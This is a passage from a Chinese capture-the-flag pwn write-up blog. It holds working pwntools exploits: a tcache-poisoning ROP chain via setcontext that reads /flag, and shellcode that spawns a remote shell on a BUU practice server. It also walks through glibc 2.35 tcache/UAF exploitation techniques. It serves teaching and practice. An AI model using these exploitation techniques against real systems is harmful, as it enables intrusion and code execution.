        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x78</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x78</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>
heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1920</span>
leak_info<span class="token punctuation">(</span><span class="token string">'heapbase'</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x78</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x78</span><span class="token punctuation">)</span>
<span class="token comment"># edit(index=0,content=b'a'*0x10)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x23</span><span class="token operator">+</span><span class="token string">b'\x07'</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ebca0</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc.address'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
leak_info<span class="token punctuation">(</span><span class="token string">'free_hook'</span><span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b'\x02'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token comment">#0x20</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#0x30 </span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token comment">#0x40 flag</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token comment">#0x50 #free(heap_base+0x2000)</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x20a0</span><span class="token punctuation">)</span><span class="token comment">#0x60 #setcontext修改rsp</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token comment">#0x70</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x3060</span><span class="token punctuation">)</span><span class="token comment">#0x80 用于让rop链连接上</span>

edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>payload<span class="token punctuation">)</span>


pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0215bf</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x23eea</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x01b96</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
pop_rax_ret <span class="token operator">=</span> <span class="token number">0x43ae8</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
syscall_ret <span class="token operator">=</span>  <span class="token number">0xd2745</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
syscall <span class="token operator">=</span> <span class="token number">0x013c0</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
ret <span class="token operator">=</span> <span class="token number">0x8aa</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address
flag_addr <span class="token operator">=</span> heap_base<span class="token operator">+</span><span class="token number">0x1000</span>

read_a <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
write_a <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
open_a <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>

<span class="token comment"># open size=0x38</span>
orw <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>
orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token comment"># orw+= p64(pop_rdx_ret)+p64(0)</span>
orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
orw<span class="token operator">+=</span>p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>

<span class="token comment">#read size = 0x38</span>
orw<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
orw<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token comment">#存放地址0x50</span>
orw<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
orw<span class="token operator">+=</span>p64<span class="token punctuation">(</span>read_a<span class="token punctuation">)</span>
<span class="token comment">#write size = 0x38</span>
orw<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
orw<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token comment">#存放地址0x50</span>
orw<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
orw<span class="token operator">+=</span>p64<span class="token punctuation">(</span>write_a<span class="token punctuation">)</span>

setcontext <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">53</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x18</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x38</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/flag'</span><span class="token punctuation">)</span>
<span class="token comment"># delete(index=0)</span>
<span class="token comment"># 写入orw，一个chunk大小不够，让两个chunk连接上</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>orw<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x60</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x78</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>orw<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x58</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#让rsp指向heap_base+0x3000，也就是存储了orw的rop的地方，一个ret可以让sectcontext的push rcx不破坏栈结构</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x48</span><span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
a<span class="token operator">=</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看别人的wp，说syscall不能带ret，会直接卡死，果然还是得要带ret才行，这道打通远程了！</p>
<h2 id="6-buu-starctf-2019-babyshell-shellcode"><a href="#6-buu-starctf-2019-babyshell-shellcode" class="headerlink" title="6.buu starctf_2019_babyshell(shellcode)"></a>6.buu starctf_2019_babyshell(shellcode)</h2><p><img src="/images/v2-0c30eb65128bb5f5e668220daa446f77_720w.png" alt="img"></p>
<p><img src="/images/v2-2504ba95ef014d2aa4ec6bd6eb6cd712_720w.png" alt="img"></p>
<p>只要绕过check就可以执行shellcode，check对我们写入的shellcode每一个字节和存储在unk_400978的字符串做比较，遍历这个字符串，如果当前shellcode的字节和字符串里任意字符匹配就继续，否则则返回0，要绕过也很简单，直接不进while就可以了，也就是说我们的shellcode以\x00开头就可以绕过check了，所以随便构造一个以\x00开头的指令就行了，我这里构造的是\x00\xc9，不要让程序卡住就行了。</p>
<p><img src="/images/v2-c22bb01e7d65a7f54a71ab1172bd4ab0_720w.png" alt="img"></p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">0</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27124</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>


payload <span class="token operator">=</span> <span class="token string">b'\x00\xc9'</span><span class="token operator">+</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'give me shellcode, plz:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="7-CISCN-2024华南分区赛pwn（高版本tcache利用，uaf）很有意思"><a href="#7-CISCN-2024华南分区赛pwn（高版本tcache利用，uaf）很有意思" class="headerlink" title="7.CISCN 2024华南分区赛pwn（高版本tcache利用，uaf）很有意思"></a>7.CISCN 2024华南分区赛pwn（高版本tcache利用，uaf）<strong>很有意思</strong></h2><p>听说是华南分区赛唯一一道pwn，舍友说很有有意思，发我让我做做，确实很有意思，自己想了很久很久，真菜啊，也正好学了一些高版本tcache的利用方法，记录一下</p>
<p>是一道保护全开的2.35堆题，经典的菜单题，但也有些不一样的</p>
<p><img src="https://picx.zhimg.com/80/v2-3b9efe516df3a9da3c662aadebceba6d_1440w.png?source=d16d100b" alt="img"></p>
<p>可以看到add中，我们只能控制最后一个申请的chunk，通过bss段上的buf指针来控制，这也是这道题的难点所在</p>
<p><img src="https://picx.zhimg.com/80/v2-911b55d37671cd7bfae67ad1aa50e22c_1440w.png?source=d16d100b" alt="img"></p>
<p>delete有明显的uaf漏洞</p>
<p><img src="https://picx.zhimg.com/80/v2-d5b11233febd9932bed3f7f2665c0205_1440w.png?source=d16d100b" alt="img"></p>
<p>show存在一个逐字节异或</p>
<p><img src="https://pica.zhimg.com/80/v2-b463e0517df270723f5f50b2d6988dc1_1440w.png?source=d16d100b" alt="img"></p>
<p>有两个edit，第一个只能改八个字节，第二个可以改0x10个，并且给了后门函数的地址，直接给了system(‘bin/sh’)，但这个修改0x10字节的edit只能用一次。用一次后bss上的flag被置零，就不能用了</p>
<p><img src="https://picx.zhimg.com/80/v2-4d89bc34e5a2b168309b0fe370168d08_1440w.png?source=d16d100b" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-b7af867ef2376c96b90eea67e3d34dce_1440w.png?source=d16d100b" alt="img"></p>
<p>看下来这道题漏洞百出，但要真想快速的利用还是不容易的，来看一下怎么做的</p>
<p>我们很容易的想到，想要利用uaf来做double free，但这是2.35，存在对double free的检测机制，从2.32开始，将chunk进行free放入tcache中的fd指针并不会直接存储下一个chunk的地址，而是做了一个异或操作，将要存储的地址，与堆地址右移12位后进行异或，再存入fd中，所以如果tcache中只有一个chunk时，fd存储的应该是0,0和堆地址右移进行异或，得到的就是堆地址右移12位的值，所以我们可以通过这个得到堆地址。以这道题为例这里先不管我为什么要add再delete前面的，我们看0x68的：</p>
<p><img src="https://pica.zhimg.com/80/v2-d97534233a8d1c8e06f72d762bcd67eb_1440w.png" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-ca4cebdb86c0afb06bc927358085caa7_1440w.png" alt="img"></p>
<p>可以看到，堆地址是0x560ae8baf000，而我们0x70大小的tcache的fd中存储的是0x560ae8baf，所以我们将这个值打印出来，再左移12位，就可以得到堆基址了 ，在这道题里，因为在show里有一个异或，所以我们再异或回去，就可以得到堆地址了，每次show都做一次这样的异或，就可以得到原始要show的信息了</p>
<p><img src="https://pic1.zhimg.com/80/v2-693e95363746b6763b20b70ef383d284_1440w.png" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-11f329e024c1ace3c76f88c77b370ea4_1440w.png" alt="img"></p>
<p>同样的，我们还可以获得程序基地址，通过edit_1中给出backdoor地址可以求得：</p>
<p><img src="https://pic1.zhimg.com/80/v2-ca30a86df966305c163ab78fda6ad4e8_1440w.png" alt="img"></p>
<p>得到了程序基地址，堆地址，我们还需要libc地址，接下来思考该怎么获得libc地址，首先想到的是通过unsortbin来泄露，但这道题因为只能控制最后一个chunk，而符合unsortbin大小的最后一个chunk在释放后都会和topchunkk进行合并，所以不能这样做，这时候，我们得到的程序基地址就可以起到很大的作用了，因为程序中有很多libc地址，比如got表，比如stdout等，现在的关键就是如何将其泄露出来。这里就要利用到UAF了，我们想要利用double free，但是因为是高版本，存在key值，所以我们不能够直接两次释放来实现，但我们可以通过uaf来直接修改已经在tcache中的chunk的fd指针，就可以直接指向我们想要的值了，如果直接将fd指向当前的chunk，就是double free了，但我们首先将fd指向tcache_ptheread_struct，修改tcache_entry，：</p>
<p><img src="https://picx.zhimg.com/80/v2-edb544bad74e50db15216b2719f92636_1440w.png" alt="img"></p>
<p> 可以看到，通过我们的edit，我们已经让fd指向了堆地址，可以对tcache_entry进行修改，在高版本，每一个tcache链的entry是由两字节来记录的，而我们只能改前8个字节，所以我们只能改0x20-0x50的entry，在最开始申请这些大小并释放，就是为了在修改了entry后我们能从tcache中取出chunk来进行再利用。</p>
<p><img src="https://picx.zhimg.com/80/v2-82400c2048600b290665072d605847b7_1440w.png" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-c0ef623336500a8ee80eea5fb71f9d5b_1440w.png" alt="img"></p>
<p>我们现在用一次0x40大小的来泄露libc地址，start是程序基地址，我们申请一个0x38的chunk，再delete，通过修改，将stdout的地址放入fd，相当于将stdout放入了tcache，再两次申请将其取出，通过show，就可以得到libc地址了</p>
<p><img src="https://picx.zhimg.com/80/v2-4c7c856e46d5975170d49d4fe1458ace_1440w.png" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-1117221887e78313cfcf844f24d63485_1440w.png" alt="img"></p>
<p>得到libc后我们就要思考该如何利用了，这道题给出了后门函数，所以我们可以打栈，将后门函数覆盖栈上的返回地址，就可以成功了，通过environ，就可以得到栈地址，我们看一下栈上情况：</p>
<p><img src="https://pic1.zhimg.com/80/v2-47f5f5479b1232c3aa3587597ba4973d_1440w.png" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-9ffbf696547881efccebe948a9a4f40d_1440w.png" alt="img"></p>
<p>画红框的地方就是我们想覆盖为后门函数的地方，理想的想法是，我们把栈上的这个返回地址通过uaf放入tcache中，再取出写为后门函数地址，如果这样做会存在一个问题，我们利用0x20的chunk，将返回地址放入tcache，再取出，写上backdoor地址，看似很好，但问题在于，<strong>在2.32，还有一个保护机制，</strong>从 tcache 中取出 chunk 时会检测 chunk 地址是否对齐的保护，而这里的0x88并没对齐，需要是<strong>0x80或者0x90</strong>类似的才算对齐，而如果我们申请到rbp，虽然可以从tcache取出，但我们只能修改8字节，不能修改到返回地址处，这里就是最需要思考的地方了，该怎么绕过这个限制呢</p>
<p><img src="https://picx.zhimg.com/80/v2-67d5cf54b37438006822e76fba530b9b_1440w.png" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-cff4d20c11e092f794be3ec52cebd253_1440w.png" alt="img"></p>
<p>我的想法是，通过uaf，直接对bss上的指针进行修改，直接将其放入tcache，再取出后直接修改其值为返回地址，这时候指针就指向返回地址了，相当于现在我们能控制的chunk就是返回地址这里，绕过了未对齐检测，就可以对返回地址进行修改了。</p>
<p><img src="https://picx.zhimg.com/80/v2-b7160ff713f41ad7ec724915861ab0f3_1440w.png" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-5f45625d38cc3f42e03e968f1c3e5e7b_1440w.png" alt="img"></p>
<p>这里buf指向了buf，就可以修改实现chunk指针的任意控制，改为返回地址，就可以了：</p>
<p>最后，有遇到一个小问题：</p>
<p><img src="https://picx.zhimg.com/80/v2-4e4338c15e1536568bda6dcd38be8189_1440w.png" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-52ec84fd350f41a8516ca8671d8722ff_1440w.png" alt="img"></p>
<p>已经进system了，segmentation fault了，原来是栈又没对齐，哈哈，没记住，太飞舞了，反正这样就打通了，给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
